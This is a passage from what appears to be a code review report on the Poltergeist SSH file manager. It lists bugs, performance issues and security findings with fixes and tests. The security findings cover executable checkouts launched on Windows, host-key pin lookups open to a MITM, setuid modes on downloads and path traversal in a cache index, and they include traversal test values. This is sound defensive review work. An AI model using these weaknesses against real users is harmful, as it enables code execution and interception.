  - App: `services/server_editor_backend.dart:73-76` saves an edited `ServerConfig` with no disconnect or invalidation. `grep BookmarkSavedChange` shows no engine reaction.
- **Evidence:** The scratch test `test/review_p1/stale_config_test.dart`, using the existing `PoolHarness`:
  1. `addServer('s1', host: 'old.example')`.
  2. Open a pane, close it, and elapse 5 minutes. The pool tears down, but the reference stays.
  3. `addServer('s1', host: 'new.example')` and open a new pane.
  4. Output: `opener dialed: [old.example, old.example] (resolveCalls=1)`.
- **Failure scenario:** A user fixes a typo in a hostname, moves a server to a new IP, switches the username, or points the bookmark at a new key file. Every new tab, reconnect cycle and transfer lease still dials the old endpoint with the old `secretRef`/`identityFilePath`, until the user finds Connections > Disconnect or restarts. Credentials resolve from the old `secretRef`, so a revoked or rotated secret keeps being tried against the old host. The UI shows the new host throughout.
- **Fix (shovel-ready):** Add `PooledConnectionManager.updateServerConfig(String serverId, ServerConfig config)`.
  - If no reference exists, do nothing; `_resolveServer` picks up the new config.
  - If `_connectionIdentity(reference.config) == _connectionIdentity(config)` (host, port, username, jumpHostId, authMethod, secretRef, identityFilePath), swap `reference.config` in place so labels and other cosmetic fields stay fresh.
  - Otherwise run the `disconnectServer(serverId)` path. That emits `disconnected`, and panes rebind with the new config.

  In `EngineHost`, call it wherever a request carries a config (`OpenBrowseChannelRequest`, `LeaseTransferChannelRequest`). Alternatively add an explicit `UpdateServerConfigRequest` that the app sends from `ServerEditorBackend.save` and bookmark edits.
- **Regression test first:** Turn the scratch test into `test/connection/pool_config_refresh_test.dart`: open, close, change config, open again, and expect the opener to dial `new.example`. Add a live-pane variant: pane open, identity change, expect `disconnected` then a rebind to the new host. Add a cosmetic-only change (label) and expect no disconnect.
- **Effort:** S–M.

#### P1-03: Remote Open launches checkouts under their original extension; executable blocklist is dead code
- **Severity:** P1 (P0 on Windows for `.js`/`.hta`/`.vbs`). **Category:** security. **NEW.** **Confidence:** VERIFIED by code trace, not executed on a Windows host.
- **Locations:**
  - `preview/preview_kinds.dart:184-187`: `previewWindowsExecutableExtensions` is referenced only by the barrel and tests. Its doc says it "guards the OPEN boundary", but no production code reads it.
  - `checkout/managed_remote_file_store.dart:172-190`: `checkoutPathFor` keeps the remote extension.
  - `engine/local_file_opener.dart:76-88`: Windows path is `explorer.exe <path>`, detached.
  - App:
    - `ui/workspace_shell.dart:2868-2880` (`_launchCheckout` calls `openSystemDefault(file.path)`).
    - `:2910-2987` (the built-in path falls back to `openSystemDefault` on `BuiltInEditorException`/`CheckoutLimitException`).
    - `:1290-1315`.
    - `services/external_file_opener.dart:268-277`: on desktop, every extension resolves to `systemDefaultId` unless the user bound an editor.
    - `services/double_click_action.dart:15`: the default double-click action is `open`.
  - Plan: `docs/plan/06-EDITOR.md` around line 1248: "Open / Open With ▸ on a remote item … never re-attaches a Windows-executable extension … to an OS launch".
- **Failure scenario:** A web developer double-clicks `app.js` on a remote web root in a Windows build. Poltergeist checks it out as `…\checkouts\<hash>\app.js` and hands it to `explorer.exe`. The default `.js` handler is Windows Script Host, so the file runs as JScript. The same applies to `.hta`, `.vbs`, `.wsf`, `.bat`, `.cmd`, `.scr`, `.exe`, `.pif`, `.cpl`. There is no confirmation and no Mark-of-the-Web, so SmartScreen and Office Protected View never engage. Even with "Edit in Poltergeist" as the default, a binary `.exe` fails the built-in editor's checks and falls back to `openSystemDefault`. macOS has analogous launch-type files: `.terminal` (runs `CommandString`), `.fileloc`/`.inetloc` (launch targets). Checkouts are 0600, which makes `.command` inert.
- **Fix (shovel-ready):**
  1. Core: add `bool isUnsafeRemoteLaunchName(String name, {required LaunchHost host})` in `preview_kinds.dart`. It checks `previewWindowsExecutableExtensions` on Windows and a small macOS/Linux list (`terminal`, `fileloc`, `inetloc`, `webloc`, `command`, `tool`, `workflow`, `app`, `desktop`, `appimage`), case-insensitively, against the last extension. Also run it against a trailing-dot or space-stripped name.
  2. App: in `_launchCheckout` and every `openSystemDefault(file.path)` reached from a remote checkout, refuse (toast plus "Reveal in folder") or require an explicit confirmation dialog whose default button is Cancel.
  3. Optional hardening: stamp checkouts with MOTW (`Zone.Identifier` ADS, ZoneId=3) on Windows and `com.apple.quarantine` on macOS so OS protections apply to anything launched.
- **Regression tests first:**
  - Core: a unit test pinning the helper's table (`app.JS`, `x.hta.`, `a.tar.gz` negative).
  - App: a widget test in which `_openRemoteEntryDefault` for `payload.hta` never calls a fake `LocalFileOpener.open` and shows the refusal or confirmation.
- **Effort:** S (core) + S/M (app wiring).

#### P1-04: TOFU pin lookup is host-spelling sensitive while pools and incidents normalize
- **Severity:** P2. **Category:** security. **NEW.** **Confidence:** VERIFIED (reproduced).
- **Locations:**
  - `connection/pool_key.dart:56-60`: `PoolKey.normalize` trims and lowercases the host.
  - `connection/connection_manager.dart:1122`: `_tofu.store.get(config.host, config.port)` uses the raw host.
  - `connection/ssh_transport.dart:166-168`: preflight builds `HostKey(host: config.host)`.
  - Pinned `seance_core/lib/src/ssh/ssh_session.dart:614`: same raw host.
  - `InMemoryHostKeyStore` keys on `'$host:$port'`.
- **Evidence:** Scratch test `test/review_p1/tofu_case_test.dart`. Pin `Example.com:22` with key `genuine`, then connect bookmark `example.com` while the server presents `attacker`. The verdicts shown are `[HostKeyVerdict.firstUse]`; the expected verdict is `changed`.
- **Failure scenario:** The key was pinned through a bookmark spelled `Server.lan`, from an ssh_config import or a synced bookmark. A second bookmark or Quick Connect typed `server.lan` is attacked by a MITM. The user sees a routine "first connection, trust this key?" dialog instead of the red changed-key block, and trusting it pins the attacker's key. It also splits the D18 incident logic: incidents are keyed by the normalized `PoolKey`, pins by the raw string. OpenSSH lowercases host names before its known_hosts lookup.
- **Fix:** Wrap the engine's pin store (`EngineHost._seededPinStore`) in a `_NormalizingHostKeyStore`:
  - `get(host, port)` looks up `PoolKey.normalize(host)` first, then falls back to the raw spelling for legacy pins.
  - `put` writes the normalized host.
  - Seeding normalizes too. On a spelling-duplicate seed conflict, keep both and treat any mismatch as `changed`.

  Make `_preflightHostKey` use the same wrapper, and make the incident-restore filter (`EngineConfig.incidents` doc) look up normalized.
- **Regression test first:** The scratch test, moved into `test/connection/pool_trust_test.dart`, plus a legacy-pin fallback case.
- **Effort:** S.

#### P1-05: Downloads apply remote mode verbatim; one `chmod` process per file
- **Severity:** P2. **Category:** security / performance. **NEW.** **Confidence:** VERIFIED.
- **Locations:**
  - `fs/local_file_system.dart:681-688` (`upload`) and `:859-866` (`copyLocalFile`): `(mode & 0xFFF)` is chmodded onto the temp.
  - The only consumer passing a remote mode is `transfer/transfer_queue.dart:2825`: `preserveMode: file.source.mode` for every hop, including remote to local.
  - `_runUtility` is at `local_file_system.dart:982`.
- **Failure scenario (security):** A compromised or hostile server serves `tool` with mode `04755` or `0777`. On a multi-user Linux or macOS machine the download becomes a setuid-as-you binary, executable by others, or a world-writable file in `~/Downloads`. Other local users can then run code as the downloading user or tamper with files the user later opens. The local umask is ignored entirely. OpenSSH `sftp get` applies `& 0777`, and umask unless `-p`; `cp` drops setuid unless `-p`.
- **Failure scenario (performance):** Measured in this container: 6.7 ms per `chmod` spawn against 0.17 ms per small write. A 10,000-file download pays about 67 s of serialized spawn time, divided across at most 6 in-flight lanes. Most spawns are no-ops, because a remote 0644 file under umask 022 already lands as 0644. macOS spawns are slower still.
- **Fix:**
  - For remote-to-local hops, pass `preserveMode: file.source.mode & 0x1FF & ~umask`. Compute the umask once, e.g. `stat` a fresh temp. Never pass setuid, setgid or sticky across a trust boundary. Keep full preservation for local-to-local copies only when the user asks for it.
  - In `LocalFileSystem.upload`/`copyLocalFile`, skip the chmod when `(await temp.stat()).mode & 0xFFF == wanted`.
  - Longer term, replace the `chmod` subprocess with an FFI `chmod(2)`/`fchmod`, since the package already uses FFI on Linux.
- **Regression tests first:**
  - A queue test: a remote source entry with `mode: 0x9ED` (04755) and `0x1FF` lands as `0x1ED` and `0x1FF & ~umask`.
  - A `LocalFileSystem` test with a fake `chmod` on `PATH` that records invocations: no spawn when the mode already matches.
- **Effort:** S.

#### P1-06: Destinations under a symlink or junction are refused
- **Severity:** P2. **Category:** bug / cross-platform. **NEW.** **Confidence:** VERIFIED (reproduced).
- **Locations:**
  - `fs/local_fs_safety.dart:189-225`: the walk refuses any pre-existing symlinked ancestor. Its doc and `docs/plan/03-ARCHITECTURE.md:235-239` say callers must resolve the existing portion first.
  - `transfer/transfer_queue.dart:1999-2003`: `_ensureDestinationRoot` passes the raw `task.destinationDir`.
  - `preview/preview_cache.dart:80-83`: passes the raw app-support path.
- **Evidence:** Scratch `work-P1/safedir`, with `Downloads` a symlink to a real directory:
  - `ensureSafeLocalDirectory('<tmp>/Downloads')` throws "Refusing to follow a non-directory or symbolic link".
  - The same happens for `Downloads/new-sub`.
  - The core test suite resolves its temp roots precisely to avoid this (`test/transfer/transfer_queue_test.dart:76-80`).
- **Failure scenario:** Every download or local copy fails into:
  - macOS `/tmp/...` (typed in the path bar);
  - a Linux `~/Downloads` or `~/Dropbox` symlinked to a data disk, reached through the standard-folder favorites (`~/Downloads`);
  - a Windows profile relocated by junction (`C:\Users` pointing to `D:\Users`), or any junction target;
  - any local-folder bookmark whose path crosses a link.
- **Fix:** In `_ensureDestinationRoot` (and `PreviewCache.open`):
  1. Find the deepest existing ancestor of the user-chosen root.
  2. `resolveSymbolicLinks()` it; this is a trust decision for a user-chosen path.
  3. Call `ensureSafeLocalDirectory(resolved + remaining components)`. The not-yet-existing components are still validated by `validateLocalName`.
  4. Commit under the resolved root.

  Remote-derived components keep the strict no-follow walk. Consider a helper `resolveTrustedLocalRoot(String)` in `local_fs_safety.dart` so both call sites share it.
- **Regression test first:** A queue test with `tempDir/real` and a link `tempDir/link` pointing to it. A remote-to-local download into `tempDir/link/sub` completes and the bytes land in `real/sub`. It fails today.
- **Effort:** S.

#### P1-07: `copy_file_range` pump makes blocking 16 MiB syscalls on the UI isolate
- **Severity:** P2. **Category:** performance / stability. **NEW.** **Confidence:** VERIFIED (code path); jank size LIKELY.
- **Locations:**
  - `fs/local_copy_pump.dart:42` (`_copyFileRangeChunkBytes = 16 MiB`).
  - `:153-240`: synchronous FFI `open` and `copy_file_range` calls, with one `Future.delayed(Duration.zero)` per chunk.
  - The pump runs where the queue runs, which is the UI isolate: `app/poltergeist_app/lib/services/transfer_queue_session.dart:160` and `docs/plan/00-OVERVIEW.md` D8 addendum ("local disk I/O … run on the UI isolate").
- **Failure scenario:**
  - Same-filesystem local copy on an HDD or USB 3 disk (about 100 MB/s): each syscall blocks the Flutter UI thread about 160 ms, one rendered frame per chunk, for the whole file. A 4 GB copy freezes the UI for about 40 s in 160 ms bursts.
  - On a hard-mounted NFS or SMB share that stalls, `open()` or `copy_file_range()` blocks the UI isolate indefinitely, so the app hangs. The streamed pump would park an IO-service thread instead.
  - The M9 measurement (3.2 GB/s, page cache) hid this: 16 MiB per 5 ms.
- **Fix:** Pick one:
  - (a) Run `_copyFileRangePump` in a helper isolate (`Isolate.run` per file, or a long-lived worker) with progress and cancel over ports. This is the right fix and removes the hung-mount freeze.
  - (b) Minimum: adaptive chunking that targets ≤4 ms per syscall. Start at 1 MiB, double while under 2 ms, halve when over 8 ms, floor 64 KiB.
- **Regression test first:** An injectable `LocalCopyPump` timing seam with a fake "syscall" that sleeps proportionally to the chunk. Assert that no single synchronous section exceeds the budget for (b), or that the pump's work runs off the calling isolate for (a), for example by asserting `Isolate.current` differs inside a test hook.
- **Effort:** M for (a), S for (b).

#### P1-08: Checkout record lost update: save and repair revert a concurrent `migrateRename`
- **Severity:** P2. **Category:** stability/data-safety. **NEW.** **Confidence:** VERIFIED (reproduced).
- **Locations:**
  - `checkout/checkout_manager.dart:487-536`: `_upload` post-commit reads `current`, then awaits lease, stat and local hash, then `_store.update(current.copyWith(...))`.
  - `:700-726`: `_repairSnapshotAgainst` captures `record`, awaits `remoteContentDigest`, which can take minutes on large files, then writes `record.copyWith(...)` with `remoteSnapshot.path = latest.path`.
  - `managed_remote_file_store.dart` `update()` replaces the whole record with no check that it is unchanged.
- **Evidence:** A scratch test added to a copy of `checkout_manager_test.dart` (`test/review_p1/checkout_lost_update_test.dart`):
  1. Stall the post-commit stat with `FakeTreeFileSystem.statGate`.
  2. Run `migrateRename('/home/test' → '/home/moved')` while it is stalled.
  3. Output: `after migrate: /home/moved/file.txt`, then `after save: /home/test/file.txt`.
- **Failure scenario:** The user saves an externally edited file, then renames its parent folder in the pane while the save's refresh runs. Or a resume-time `needsReconcile` repair is hashing a large file during the rename. The record snaps back to the dead path.
  - The next save CAS-fails with "changed or was deleted on the server".
  - `checkoutFor(server, newPath)` misses, so opening the renamed file creates a second checkout.
  - The old edits sit behind a record that no longer maps to the file.
- **Fix:** Add a serialized compare-and-patch to the store: `Future<ManagedRemoteFile?> patch(String id, ManagedRemoteFile? Function(ManagedRemoteFile current) change)`, running inside `_serialized`.
  - The post-commit refresh patches only `remoteSnapshot`/`baselineSha256`/`dirty`/`needsReconcile`, and only if `current.remotePath == pathItStatted`. Otherwise it keeps `needsReconcile: true` and lets the next reconcile repair it.
  - `_repairSnapshotAgainst` does the same.
  - `migrateRename` uses `patch` too.
- **Regression test first:** The scratch test above, plus the analogous repair-path test gated on `downloadGate`.
- **Effort:** S–M.

#### P1-09: Windows name rules enforced on POSIX destinations
- **Severity:** P2. **Category:** UX / cross-platform. **NEW**; 03 §2.3's wording sanctions it, but it contradicts 09 §3.5's "destination-aware … only in the `windowsDestination` branch". **Confidence:** VERIFIED.
- **Locations:**
  - `fs/local_fs_safety.dart:95-119`: `validateLocalName` rejects `:*?"<>|`, control characters, trailing dot or space, and reserved stems on every platform.
  - Consumers: `local_file_system.dart:621` (`upload`), `:762` (`copyLocalFile`), `local_fs_safety.dart:251` (`replaceLocalFile`), `transfer/recursive_walker.dart:375`.
- **Failure scenario:** On Linux or macOS the following cannot be downloaded or locally copied at all, and tree downloads fail per item:
  - `db-2026-09-26T03:00:00.sql.gz`, `12:30 meeting.txt`, `aux.c`/`con.h` (both exist in real C trees, e.g. the Linux kernel), `what?.md`, `notes.`, `"quoted".txt`.
  - macOS Finder shows `:` as `/` and allows it.
- **Fix:** Make it destination-aware with `validateLocalName(name, {required bool windowsDestination})`, defaulting to `Platform.isWindows`, and keep shape checks (`/`, `\`, NUL, `.`/`..`, NAME_MAX) everywhere. Optionally detect FAT, exFAT and NTFS mounts on POSIX (via `statfs` f_type on Linux, `f_fstypename` on macOS) and apply the Windows branch there. Longer term, offer a "rename on download" conflict verb for hazard names.
- **Regression test first:** `local_fs_safety_test.dart`: on a POSIX host, `validateLocalName('a:b')` and `('aux.c')` do not throw, and with `windowsDestination: true` they still throw. Add a queue test downloading `x:y.txt` to a POSIX temp dir.
- **Effort:** S (plus a plan precision edit in 03 §2.3).

#### P1-10: Host-key and keyboard-interactive prompts outlive their connect
- **Severity:** P3. **Category:** UX. **NEW.** **Confidence:** LIKELY.
- **Locations:**
  - `engine/engine_host.dart:1134-1159` (`hostKey`) and `:1161-1183` (`keyboard`): withdrawn only by a reply or `dismissAll` at shutdown. Only `resolveCredentials` wires a scope (`:1207`).
  - `connection/ssh_transport.dart:195-201,233`: preflight waits up to 5 min. A server's `LoginGraceTime`, 120 s by default, closes the socket first and surfaces "the connection closed before key exchange", which is misleading because kex already happened.
- **Failure scenario:** A careful user takes more than 2 minutes to verify a fingerprint out of band, or clicks Disconnect or Cancel while the dialog is up. The connect fails, but the dialog stays. A late Trust re-pins through the preflight's closure (when the epoch still matches), or nothing happens.
- **Fix:**
  - Give the host-key and keyboard prompters a dismissal token tied to the attempt (the same `CredentialResolutionScope` pattern). Fire it when the preflight or connect future completes by any path, or when the pool loses its last reference.
  - In preflight, map `client.done` after the verifier started to "the server closed the connection while waiting for your answer".
- **Regression test:** `engine_host_test`: a preflight fake whose `client.done` completes while the prompt is open. Expect a `PromptDismissedEvent` for that promptId.
- **Effort:** S–M.

#### P1-11: Local `listDirectory` stats serially
- **Severity:** P3. **Category:** performance. **NEW.** **Confidence:** VERIFIED (measured).
- **Location:** `fs/local_file_system.dart:136-160`: `await FileStat.stat(entity.path)` per entry, one at a time.
- **Evidence:** 20,000 entries: 1,176 ms sequential, 418 ms with a 64-wide `Future.wait` window, 100 ms with `statSync`. A 100k-entry directory (`node_modules` roots, maildirs, `/usr/lib`) takes about 6 s before the first paint of a local pane. The queue's recursive walker pays the same on the UI isolate.
- **Fix:** Collect entries, then stat in bounded windows of about 64 with `Future.wait`, preserving `followLinks: false` link handling. Avoid `statSync` on the engine isolate because of hung network mounts.
- **Test:** A behavior-preserving test that ordering and contents are unchanged. The benchmark hook exists (`benchmark/p3_listing_overhead.dart`).
- **Effort:** S.

#### P1-12: Preview-cache index can point outside the cache directory
- **Severity:** P3. **Category:** security (defense in depth). **NEW.** **Confidence:** VERIFIED (code).
- **Location:** `preview/preview_cache.dart:292-303`: `path: p.join(directory.path, fileName)`. An absolute `fileName` makes `p.join` return that path, and `../x` escapes the directory. `enforce()`/`clear()` then `delete()` it (`:158`, `:182`), and `lookup()` hands it to the renderer (`:93-101`).
- **Failure scenario:** A tampered or corrupted `index.json` makes the cache delete or preview arbitrary user files, such as `~/.ssh/id_ed25519` in the text preview. This needs a local same-user writer, so it is low severity, but the fix is a one-liner.
- **Fix:** In `_loadIndex`, skip entries whose `fileName` is not a single component matching `^[0-9a-f]{64}(\.[A-Za-z0-9_-]{1,16})?$`.
- **Test:** An index entry with `"file": "/etc/hosts"` and one with `"../x"` are dropped at open, and `clear()` never touches them.
- **Effort:** S.

#### P1-13: ssh_config tokens import literally
- **Severity:** P3. **Category:** missing-feature. **NEW.** **Confidence:** VERIFIED (neither `import/ssh_config_import.dart` nor the pinned importer expands `%`).
- **Failure scenario:** `HostName %h.corp.example` or `IdentityFile ~/.ssh/%h_ed25519` (common patterns) import as the literal `%h.corp.example`. The bookmark silently fails DNS or key reading, with no D22 badge.
- **Fix:** Expand `%h` (alias), `%u`/`%r` (User or local user), `%p`, `%d` (home), `%%` in HostName and IdentityFile at import. Badge anything else (`%C`, `%L`, `%n`, `${ENV}`) as a new `SshConfigImportLimitation.unexpandedToken`.
- **Test:** Table tests in `ssh_config_import_test.dart`.
- **Effort:** S.

#### P1-14: Metadata stores written at umask default
- **Severity:** P3. **Category:** privacy. **NEW.** **Confidence:** VERIFIED.
- **Locations:** `bookmarks/bookmark_store.dart:888-908`, `sync/server_store.dart:425`, `sync/persistent_record_store.dart:407`. Each calls `_atomicWriter(file, contents)` without `restrictToOwner`. The managed index, incidents and preview temps are owner-only.
- **Failure scenario:** On a multi-user Linux host, `~/.local/share/<app>/bookmarks.json` and `servers.json` are 0644 under a 0755 support dir. They list every host, username, key path and remote path. There are no secrets, but they are a useful reconnaissance map.
- **Fix:** Pass `restrictToOwner: true` for these three stores, and chmod the support dir 0700 once at startup.
- **Effort:** S.

#### P1-15: `explorer.exe` comma parsing
- **Severity:** P3. **Category:** cross-platform. **NEW.** **Confidence:** SPECULATIVE.
- **Location:** `engine/local_file_opener.dart:82-84`. Dart quotes Windows arguments only when they contain whitespace or quotes, and `explorer.exe` treats `,` as a switch separator.
- **Failure scenario:** Opening `C:\...\report,final.pdf` opens the wrong target or the Documents folder. Checkout names keep commas.
- **Fix:** Use `ShellExecuteExW` through FFI (`SEE_MASK_NOASYNC`, verb `open`), which also returns real error codes. Failing that, fall back to `rundll32 shell32.dll,ShellExec_RunDLL`.
- **Effort:** S–M.

#### P1-16: Small correctness nits
- `preview/preview_produce.dart:309-312`: the comment says "A removed row resolves its waiter as cancelled", but `if (task == null || !task.isTerminal) return;` leaves the completer pending forever. `CheckoutManager._onQueueEvent` fails the waiter in the same situation (`checkout_manager.dart:853-870`). Unreachable today because `removeTask` emits no event, but copy the checkout behavior.
- `fs/local_file_system.dart` `createDirectory`/`rename`/`createSymbolicLink` do not run `validateLocalName` on the new leaf, unlike `upload`/`copyLocalFile`. This is defense in depth for pane verbs, and 09 §3.5 says a local mkdir without it "is the same review defect".
- `fs/local_file_system.dart:982-987`: `_runUtility` runs `chmod`/`chown` from `PATH`, while `restrictLocalPathPermissions` (`local_fs_safety.dart:140-150`) deliberately resolves `/usr/bin/chmod` to avoid PATH hijack. Make them consistent.

#### P1-K: Known items rechecked (still present)
- `EngineHost._channels` never maps back to a serverId, so pool pane channels leak until close. Per-serverId maps also grow without bound (STATUS open item 3, audit finding C). Confirmed at `engine_host.dart:78` and `connection_manager.dart`.
- Listings are still not cancellable (STATUS open item 12). `ListDirectoryRequest` has no cancel, and `VfsContentDigest` over a lease (a full-file read for repair) has no cancel either.

### 3. Best PR candidates

1. **P1-02: refresh server configs.** About 150 lines including tests. First, add `test/connection/pool_config_refresh_test.dart` with the reproduced case (open, close, edit host, open; expect `new.example`), a live-pane variant (identity change produces `disconnected` then a rebind to the new host) and a cosmetic-only variant (label change, no disconnect). Then add `updateServerConfig` to `PooledConnectionManager` (connection-identity comparison; swap in place or run the `disconnectServer` path). Call it from `EngineHost` for `OpenBrowseChannelRequest`/`LeaseTransferChannelRequest` configs before acquisition. Low regression risk: it only changes behavior when the identity really changed.

2. **P1-01a: the engine survives uncaught errors.** Core only, about 200 lines. The test comes first: `spawnForTesting` with an entrypoint wrapping `engineMain` that throws from a microtask after boot. Expect a later request still answered, and `EngineFaultEvent` delivered. Implement `runZonedGuarded` in `engineMain`, add the protocol v14 `EngineFaultEvent` (message only) and the client stream. Follow up with a separate app PR for supervisor, respawn and banner (P1-01b), plus an upstream dartssh2 `onError`/`allowMalformed` patch.

3. **P1-03: remote launch guard.** About 250 lines. Write the core table test for `isUnsafeRemoteLaunchName` and an app widget test that `payload.hta` and `app.js` never reach the fake opener on a Windows `EditorHostPlatform`. Add the helper next to `previewWindowsExecutableExtensions` (with macOS/Linux additions), then gate `_launchCheckout` and the two fallbacks in `workspace_shell.dart` with a confirm-or-reveal dialog. MOTW and quarantine stamping can be a follow-up.

4. **P1-04: normalized pin store.** About 120 lines. Move the reproduced `tofu_case_test` into `pool_trust_test.dart` along with a legacy raw-spelling pin case. Wrap the engine pin store (`_seededPinStore`) and `_preflightHostKey`'s lookup with `PoolKey.normalize` host keys plus legacy fallback. Seeds and `HostKeyPinnedEvent` carry the normalized host, so the app store converges.

5. **P1-06: resolve trusted local roots.** About 100 lines. The queue test comes first: download into `tempDir/link/sub` where `link` points to `real`. Expect completion and bytes in `real/sub`. Add `resolveTrustedLocalRoot()` to `local_fs_safety.dart` (deepest existing ancestor, `resolveSymbolicLinks`, append the missing components). Use it in `_ensureDestinationRoot` and `PreviewCache.open`. Remote-derived components keep the strict walk.

6. **P1-08: store compare-and-patch.** About 200 lines. Start from the reproduced gated-stat test. Add `ManagedRemoteFileStore.patch(id, change)` inside `_serialized`, and route `_upload`'s post-commit refresh, `_repairSnapshotAgainst` and `migrateRename` through it with a `remotePath` precondition. Add a second test gating the repair's digest download.

P1-05's mode clamp is also a good small PR, about 80 lines, but it touches `transfer_queue.dart` and belongs with that slice's owner.

### 4. Ideas

- **Engine watchdog with state replay.** The app already owns everything the engine needs: pins, incidents, pane bindings, queue journal. A supervisor that respawns and rebinds in under a second would make engine faults nearly invisible. First useful slice: expose `terminated` plus a "Reconnect all" banner.
- **"This server's settings changed — reconnect now?" chip** on panes bound to an edited server, instead of a silent forced disconnect. First slice: P1-02's detection surfaces a `ServerStatus.detail` of "settings changed".
- **Mark of the Web / quarantine for everything that leaves a remote.** Checkouts, drag-out files and downloads get `Zone.Identifier` on Windows and `com.apple.quarantine` on macOS, so SmartScreen, Gatekeeper and Office Protected View do their job. First slice: checkouts only, one FFI or xattr call after the commit rename.
- **Visual host-key identity in the TOFU dialog.** Show OpenSSH-style randomart plus a "check SSHFP in DNS" button, since the dialog is the one moment users verify. First slice: randomart from the SHA-256 fingerprint (pure function).
- **NFC-aware name identity on macOS.** Show a small badge when two rows differ only by Unicode normalization, and make case-only rename detection normalization-aware (`_isCaseOnlyVariant`). First slice: a pure `namesEquivalentOnHost()` helper used by the rename preflight.
- **Adaptive, off-isolate local copy with live throughput.** Move `copy_file_range` into a worker isolate that reports bytes/s. The activity panel can then show "kernel copy (reflink)" when a copy completes suspiciously fast. First slice: the per-chunk timing budget from P1-07(b).
- **ssh_config import "explain" view.** For each imported row, show the effective directives with their source line (file:line), including expanded tokens and the ones that were not expanded. First slice: carry `sourcePath:line` for HostName and IdentityFile in `SshConfigImportRow`.

---

## P2 — Poltergeist data-moving code (transfer queue, journal, trash, local ops, sync engine, rsync exporter)

Reviewer slice P2. Code read at Poltergeist `913ca3d` (main). Pinned Séance adapter read from the pub cache (`Seance-035b0d8…`, v0.9.1). rsync behavior checked against rsync's current source (`options.c`, `exclude.c`, `lib/wildmatch.c`, `NEWS.md`). No rsync binary was run.

Repro tests live outside the repo in `scratchpad/work-P2/` (a copy of the Poltergeist packages), run with the bundled Dart 3.13.2:
- `packages/poltergeist_core/test/p2_repro/{park_repro,dir_retry_repro,compaction_thrash,retry_compaction_repro,queue_repro,replace_scaling,nest_repro}_test.dart`
- `packages/poltergeist_sync/test/{p2_repro,p2_symlink_repro}_test.dart`

Each repro that fails on current code is marked **VERIFIED (repro)** below.

### 1. Summary

The code is careful at the level of a single operation. Atomic temp+rename commits, CAS `expectedTarget`, nofollow stats, post-order deletes, confirm-gated permanent deletes, and journal write-before-effect are consistent throughout, and the tests pin a lot of it. The biggest risks are in how operations compose:

- **Transfer queue:** with the default `ask` folder policy, a folder that collides at the destination has all its subfolders silently skipped. Only its top-level files transfer, and the task ends "completed" with skips that cannot be retried. A transient disconnect during a parent `mkdir` does the same (P2-01).
- **Sync engine:** Mirror deletes the destination's real directory contents when the source has a symlink at that path (P2-02), and it does not subsume a replaced directory's children (P2-03). Both contradict 05 §3 / §6 rule 4. An update with `backups: trash` whose upload fails leaves the destination missing the file, with the backup unjournaled (P2-04).
- **Journal:** compaction thrashes. Once one live task has ~5k files, every journal append rewrites and fsyncs the whole journal on the UI isolate (P2-05). Retrying a task after compaction also makes it unrestorable (P2-09).
- **Within-task collisions:** case twins, NFC/NFD twins and same-basename roots go through the conflict policy as if the occupant already existed. With `replace` plus move, one file is destroyed. Séance rejects this case outright (P2-06).
- **rsync exporter:** for remote pairs it backslash-escapes filter patterns that rsync never re-parses. This disables the default `.poltergeist*` exclude and any pattern with a space. It also double-escapes remote paths on rsync ≥ 3.2.4 (P2-07).
- **Performance:** local commits are O(N²) per directory, and every file spawns a `chmod` subprocess (P2-08, measured). Several O(n²) loops run on the UI isolate (P2-13).

### 2. Findings

| ID | Title | Sev | Category | New/Known | Confidence |
|---|---|---|---|---|---|
| P2-01 | Subfolders of a parked (ask) folder, or of a folder whose mkdir hit a disconnect, are skipped as collateral and never re-armed | P1 | bug / data-safety | NEW | VERIFIED (repro) |
| P2-02 | Mirror deletes the destination's real directory contents under a source-side symlink path | P1 | data-safety | NEW | VERIFIED (repro) |
| P2-03 | Sync differ does not subsume a replaced directory's destination-only descendants: they delete even when the kind conflict is unresolved, are double-counted, and conflict spuriously | P1 | data-safety | NEW | VERIFIED (repro) |
| P2-04 | Sync update with `backups: trash`: a failed upload leaves the destination missing the file, and the backup is unjournaled and unrestorable | P1 | data-safety | NEW | VERIFIED (repro) |
| P2-05 | Transfer journal compaction thrash: every append rewrites and fsyncs the whole journal once live records exceed 4 MiB | P1 | performance / stability | NEW | VERIFIED (repro) |
| P2-06 | Within-task destination collisions (case/NFC twins, same-basename roots) are resolved by policy. `replace` plus move destroys a source | P1 | data-safety | NEW (spec'd in 03 §4.2, unimplemented) | VERIFIED (decision flow via repro; real-FS outcome inferred) |
| P2-07 | rsync exporter escapes filter patterns for remote pairs, which disables the default and user excludes. Remote paths are double-escaped on rsync ≥ 3.2.4 | P1 | security / data-safety | NEW | VERIFIED (rsync source) |
| P2-08 | Local commits are O(N²) per directory (full listing per new file), and every file spawns a `chmod` subprocess | P2 | performance | NEW | VERIFIED (measured) |
| P2-09 | Retrying a task after journal compaction orphans its records, so the task is not restored after a crash | P2 | stability / data-safety | NEW | VERIFIED (repro) |
| P2-10 | Sync items carry one spelling for both sides, and the differ NFC-folds even normalization-sensitive sides: pairs never converge | P2 | bug | NEW | VERIFIED (code trace) |
| P2-11 | Restored delete tasks delete whatever is now at the path, with no identity re-check against the journaled entry | P2 | data-safety | NEW | VERIFIED (code trace) |
| P2-12 | D15 per-server remote-trash opt-in is not wired: every remote delete is permanent | P2 | missing-feature | NEW (not in open items) | VERIFIED (code trace) |
| P2-13 | UI-isolate stalls: 16 MiB synchronous `copy_file_range`, O(dirs×items) move cleanup, O(n²) `canRetryTask` in row build, O(n²) `_normalizeRoots`, O(n²) sync `lastAttempt` | P2 | performance | NEW | VERIFIED (code trace) |
| P2-14 | Folder conflict offers Merge / Replace-if-newer against a non-directory occupant; answering re-parks, so the prompt loops | P3 | UX | NEW | VERIFIED (code trace) |
| P2-15 | Progress/ETA: skipped and failed bytes stay in `totalBytes`, so the bar stalls and the ETA is inflated | P3 | UX | NEW | VERIFIED (code trace) |
| P2-16 | No engine-level guard against a destination inside a source root; the app guard is lexical only | P3 | stability | KNOWN in part (pane_drop.dart comment) | LIKELY |
| P2-17 | Boot restore's temp sweep leases every journaled server at launch and can pop credential prompts before Resume | P3 | UX / privacy | NEW | VERIFIED (code trace) |
| P2-18 | Transfer journal lacks the sync journal's leading-`\n` guard: a partial write glues onto the next record, and the quarantine drops every later record. Write failures degrade to a notice | P3 | robustness | NEW | LIKELY |
| P2-19 | Symlink-swap TOCTOU on local source reads; the sync executor re-checks only the destination parent chain | P3 | security hardening | NEW | SPECULATIVE |

---

#### P2-01 — Subfolders of a parked folder (default `ask`) or a disconnect-retried folder are skipped as collateral
